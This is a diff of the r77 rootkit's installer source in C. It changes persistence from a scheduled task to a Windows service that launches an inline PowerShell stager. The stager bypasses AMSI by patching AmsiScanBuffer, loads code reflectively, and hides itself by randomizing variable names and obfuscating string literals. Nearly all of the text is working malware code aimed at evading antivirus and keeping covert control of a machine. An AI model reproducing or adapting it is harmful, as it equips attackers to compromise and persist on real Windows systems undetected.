@@ -24,27 +24,22 @@ int main()
 	// The C# binary will proceed with starting the r77 service using reflective DLL injection.
 	// The powershell command is purely inline and doesn't require a ps1 file.
 
-	LPWSTR powershellCommand = GetPowershellCommand();
+	LPWSTR startupCommand = GetStartupCommand();
 
-	// Create scheduled task to run the powershell stager.
-	DeleteScheduledTask(R77_SERVICE_NAME32);
-	DeleteScheduledTask(R77_SERVICE_NAME64);
-
-	LPCWSTR scheduledTaskName = Is64BitOperatingSystem() ? R77_SERVICE_NAME64 : R77_SERVICE_NAME32;
-	if (CreateScheduledTask(scheduledTaskName, L"", L"powershell", powershellCommand))
-	{
-		RunScheduledTask(scheduledTaskName);
-	}
+	DeleteWindowsService(R77_SERVICE_NAME);
+	CreateWindowsService(R77_SERVICE_NAME, startupCommand);
 
 	return 0;
 }
 
-LPWSTR GetPowershellCommand()
+LPWSTR GetStartupCommand()
 {
 	// Powershell inline command to be invoked using powershell.exe "..."
 
 	PWCHAR command = NEW_ARRAY(WCHAR, 16384);
-	StrCpyW(command, L"\"");
+
+	// A Windows Service does not start when using powershell.exe directly, but cmd.exe wrapping powershell.exe works.
+	StrCpyW(command, L"cmd.exe /c \"powershell.exe -Command \"\"");
 
 	// AMSI bypass:
 	// [Reflection.Assembly]::Load triggers AMSI and the byte[] with Stager.exe is passed to AV for analysis.
@@ -74,7 +69,7 @@ LPWSTR GetPowershellCommand()
 			L"}"
 
 			// Use Microsoft.Win32.UnsafeNativeMethods for some DllImport's.
-			L"$NativeMethods=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(`System.dll`)})"
+			L"$NativeMethods=([AppDomain]::CurrentDomain.GetAssemblies()^|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(`System.dll`)})"
 			L".GetType(`Microsoft.Win32.UnsafeNativeMethods`);"
 			L"$GetProcAddress=$NativeMethods.GetMethod(`GetProcAddress`,[Reflection.BindingFlags](`Public,Static`),$Null,[Reflection.CallingConventions]::Any,@((New-Object IntPtr).GetType(),[string]),$Null);"
 
@@ -156,30 +151,30 @@ LPWSTR GetPowershellCommand()
 		L".Invoke($Null,$Null)"
 	);
 
-	StrCatW(command, L"\"");
+	StrCatW(command, L"\"\"\"");
 
 	// Replace string literals that are marked with `thestring`.
-	ObfuscatePowershellStringLiterals(command);
+	ObfuscateStringLiterals(command);
 
 	// Obfuscate all variable names with random strings.
-	ObfuscatePowershellVariable(command, L"Get-Delegate");
-	ObfuscatePowershellVariable(command, L"ParameterTypes");
-	ObfuscatePowershellVariable(command, L"ReturnType");
-	ObfuscatePowershellVariable(command, L"TypeBuilder");
-	ObfuscatePowershellVariable(command, L"NativeMethods");
-	ObfuscatePowershellVariable(command, L"GetProcAddress");
-	ObfuscatePowershellVariable(command, L"LoadLibraryDelegate");
-	ObfuscatePowershellVariable(command, L"VirtualProtectDelegate");
-	ObfuscatePowershellVariable(command, L"Kernel32Ptr");
-	ObfuscatePowershellVariable(command, L"LoadLibraryPtr");
-	ObfuscatePowershellVariable(command, L"VirtualProtectPtr");
-	ObfuscatePowershellVariable(command, L"AmsiPtr");
-	ObfuscatePowershellVariable(command, L"AmsiScanBufferPtr");
-	ObfuscatePowershellVariable(command, L"OldProtect");
+	ObfuscateVariable(command, L"Get-Delegate");
+	ObfuscateVariable(command, L"ParameterTypes");
+	ObfuscateVariable(command, L"ReturnType");
+	ObfuscateVariable(command, L"TypeBuilder");
+	ObfuscateVariable(command, L"NativeMethods");
+	ObfuscateVariable(command, L"GetProcAddress");
+	ObfuscateVariable(command, L"LoadLibraryDelegate");
+	ObfuscateVariable(command, L"VirtualProtectDelegate");
+	ObfuscateVariable(command, L"Kernel32Ptr");
+	ObfuscateVariable(command, L"LoadLibraryPtr");
+	ObfuscateVariable(command, L"VirtualProtectPtr");
+	ObfuscateVariable(command, L"AmsiPtr");
+	ObfuscateVariable(command, L"AmsiScanBufferPtr");
+	ObfuscateVariable(command, L"OldProtect");
 
 	return command;
 }
-VOID ObfuscatePowershellVariable(LPWSTR command, LPCWSTR variableName)
+VOID ObfuscateVariable(LPWSTR command, LPCWSTR variableName)
 {
 	DWORD length = lstrlenW(variableName);
 	WCHAR newName[100];
@@ -193,7 +188,7 @@ VOID ObfuscatePowershellVariable(LPWSTR command, LPCWSTR variableName)
 		}
 	}
 }
-VOID ObfuscatePowershellStringLiterals(LPWSTR command)
+VOID ObfuscateStringLiterals(LPWSTR command)
 {
 	// Replace all string literals like
 	// `thestring`
